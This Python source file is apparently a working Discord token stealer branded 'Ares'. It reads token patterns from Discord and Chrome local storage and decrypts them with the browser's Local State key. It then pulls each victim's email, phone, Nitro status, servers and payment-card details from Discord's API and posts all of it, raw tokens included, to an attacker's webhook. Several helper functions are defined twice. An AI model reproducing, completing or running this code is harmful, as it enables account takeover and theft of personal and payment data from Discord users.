import os
import base64
import json
import requests
import re
import win32crypt
import datetime
from Crypto.Cipher import AES

hk = "%WEBHOOK%"

PATHS = {
    "Discord": os.path.join(os.getenv("APPDATA"), "Discord", "Local Storage", "leveldb"),
    "Discord Canary": os.path.join(os.getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"),
    "Discord PTB": os.path.join(os.getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"),
    "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")
}

def getkey(path):
    with open(os.path.join(os.path.dirname(path), "..", "Local State"), "r", encoding="utf-8") as f:
        return json.loads(f.read())["os_crypt"]["encrypted_key"]

def gettokens(path):
    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            
            try:
                with open(os.path.join(path, file_name), "r", encoding="utf-8", errors="ignore") as f:
                    for line in f.readlines():
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in re.findall(regex, line):
                                tokens.append(token)
                        
                        for token in re.findall(r"dQw4w9WgXcQ:([^\"]*)", line):
                            tokens.append(f"dQw4w9WgXcQ:{token}")
            except:
                pass
    except:
        pass
            
    return tokens

def decrypt_token(encrypted_token, key_path):
    try:
        if not encrypted_token.startswith("dQw4w9WgXcQ:"):
            return encrypted_token
            
        token = encrypted_token.replace("\\", "") if encrypted_token.endswith("\\") else encrypted_token

        encrypted_key = base64.b64decode(getkey(key_path))[5:]
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        token_parts = token.split('dQw4w9WgXcQ:')[1]
        token_bytes = base64.b64decode(token_parts)

        nonce = token_bytes[3:15]
        ciphertext = token_bytes[15:]
        cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce)

        return cipher.decrypt(ciphertext)[:-16].decode()
    except Exception as e:
        return None

def af(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    
    user_info = {}
    
    try:
        response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        if response.status_code == 200:
            user_data = response.json()
            user_info["username"] = f"{user_data.get('username')}#{user_data.get('discriminator')}" 
            user_info["email"] = user_data.get("email")
            user_info["phone"] = user_data.get("phone")
            user_info["id"] = user_data.get("id")
            user_info["avatar"] = f"https://cdn.discordapp.com/avatars/{user_data.get('id')}/{user_data.get('avatar')}.png" if user_data.get('avatar') else None
    except:
        pass

    try:
        payment_response = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers)
        if payment_response.status_code == 200:
            payment_data = payment_response.json()
            payment_methods = []
            for method in payment_data:
                if method.get("type") == 1: 
                    payment_methods.append({
                        "type": "Credit Card",
                        "brand": method.get("brand"),
                        "last_4": method.get("last_4"),
                        "expires": f"{method.get('expires_month')}/{method.get('expires_year')}"
                    })
                elif method.get("type") == 2:
                    payment_methods.append({
                        "type": "PayPal",
                        "email": method.get("email")
                    })
            user_info["payment_methods"] = payment_methods
    except:
        pass
    
    return user_info

def create_embed(title=None, description=None, color=None):
    embed = {}
    if title:
        embed["title"] = title
    if description:
        embed["description"] = description
    if color:
        embed["color"] = color
    return embed

def add_field(embed, name, value, inline=False):
    if "fields" not in embed:
        embed["fields"] = []
    embed["fields"].append({
        "name": name,
        "value": value,
        "inline": inline
    })
    return embed

def set_footer(embed, text, icon_url=None):
    embed["footer"] = {"text": text}
    if icon_url:
        embed["footer"]["icon_url"] = icon_url
    return embed

def set_author(embed, name, url=None, icon_url=None):
    embed["author"] = {"name": name}
    if url:
        embed["author"]["url"] = url
    if icon_url:
        embed["author"]["icon_url"] = icon_url
    return embed

def set_image(embed, url):
    embed["image"] = {"url": url}
    return embed

def set_thumbnail(embed, url):
    embed["thumbnail"] = {"url": url}
    return embed


def send_webhook(webhook_url, content=None, embeds=None, username=None, avatar_url=None):
    payload = {}
    if content:
        payload["content"] = content
    if embeds:
        payload["embeds"] = embeds
    if username:
        payload["username"] = "Ares"
    if avatar_url:
        payload["avatar_url"] = avatar_url

    headers = {
        "Content-Type": "application/json"
    }

    requests.post(webhook_url, json=payload, headers=headers, timeout=10)



def create_embed(title=None, description=None, color=None):
    embed = {}
    if title:
        embed["title"] = title
    if description:
        embed["description"] = description
    if color is not None:
        embed["color"] = color
    return embed

def add_field(embed, name, value, inline=False):
    if "fields" not in embed:
        embed["fields"] = []
    
    if value and len(value) > 1024:
        value = value[:1021] + "..."
    
    if name and len(name) > 256:
        name = name[:253] + "..."
    
    embed["fields"].append({
        "name": name,
        "value": value,
        "inline": inline
    })

def set_thumbnail(embed, url):
    embed["thumbnail"] = {"url": url}

def set_author(embed, name, url=None, icon_url=None):
    author = {"name": name}
    if url:
        author["url"] = url
    if icon_url:
        author["icon_url"] = icon_url
    embed["author"] = author

def set_footer(embed, text, icon_url=None):
    footer = {"text": text}
    if icon_url:
        footer["icon_url"] = icon_url
    embed["footer"] = footer

def main():
    checked = []
    user_data = []
    
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
            
        for token in gettokens(path):
            decrypted_token = decrypt_token(token, path)
            if not decrypted_token or decrypted_token in checked:
                continue
                
            checked.append(decrypted_token)
            account_info = af(decrypted_token)
            
            if account_info:
                account_info["platform"] = platform
                account_info["token"] = decrypted_token
                user_data.append(account_info)
    
    if user_data:
        ares_color = 0xC80815  
        
        rawr = []
        
        for user in user_data:
            embed = create_embed(
                title=f"🔰 Discord Account Found",
                description=f"🎮 Account information captured from **{user.get('platform')}**",
                color=ares_color
            )
            
            embed["timestamp"] = datetime.datetime.utcnow().isoformat()

            add_field(embed, "👤 Username", f"`{user.get('username', 'N/A')}`", inline=True)
            add_field(embed, "🆔 User ID", f"`{user.get('id', 'N/A')}`", inline=True)
            add_field(embed, "📧 Email", f"`{user.get('email', 'N/A')}`", inline=True)
            add_field(embed, "📱 Phone", f"`{user.get('phone', 'None')}`" if user.get('phone') else "`None`", inline=True)
            nitro_status = "No Nitro"
            try:
                response = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", 
                                      headers={"Authorization": user.get("token")})
                if response.status_code == 200 and response.json():
                    nitro_status = "✅ Nitro"
                else:
                    nitro_status = "❌ No Nitro"
            except:
                pass
            
            add_field(embed, "⭐ Nitro Status", nitro_status, inline=True)

            try:
                guilds_response = requests.get("https://discord.com/api/v9/users/@me/guilds", 
                                             headers={"Authorization": user.get("token")})
                if guilds_response.status_code == 200:
                    guild_count = len(guilds_response.json())
                    add_field(embed, "🌐 Servers", f"`{guild_count}`", inline=True)
            except:
                add_field(embed, "🌐 Servers", "`Unknown`", inline=True)

            if user.get("payment_methods"):
                payment_info = ""
                for method in user.get("payment_methods"):
                    if method.get("type") == "Credit Card":
                        payment_info += f"💳 **{method.get('brand')}** ending in *{method.get('last_4')}*\n"
                        payment_info += f"   ⏳ Expires: {method.get('expires')}\n"
                    elif method.get("type") == "PayPal":
                        payment_info += f"<:paypal:1234567890> **PayPal**: {method.get('email')}\n"
                
                add_field(embed, "💰 Payment Methods", payment_info or "`None`", inline=False)
            else:
                add_field(embed, "💰 Payment Methods", "`None`", inline=False)

            token = user.get("token", "N/A")
            if token != "N/A":
                add_field(embed, "🔑 Token", f"```{token}```", inline=False)
            else:
                add_field(embed, "🔑 Token", "`N/A`", inline=False)

            if user.get("avatar"):
                set_thumbnail(embed, user.get("avatar"))

            platform_icons = {
                "Discord": "https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png",
                "Discord Canary": "https://cdn.discordapp.com/attachments/1062323324698939392/1062323501688184934/canary.png",
                "Discord PTB": "https://cdn.logojoy.com/wp-content/uploads/20210422095037/discord-mascot.png",
                "Chrome": "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Google_Chrome_icon_%28February_2022%29.svg/1200px-Google_Chrome_icon_%28February_2022%29.svg.png"
            }
            
            platform = user.get("platform")
            set_author(embed, f"Captured from {platform}", None, platform_icons.get(platform))

            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            set_footer(embed, f"Captured at {current_time} • Powered by Ares", "https://i.imgur.com/Mewaogf.png")
            
            rawr.append(embed)

           
        send_webhook(
            hk, 
            embeds=rawr, 
            username="Ares", 
            avatar_url="https://i.imgur.com/Mewaogf.png"
        )

        return rawr

if __name__ == "__main__":
    main()
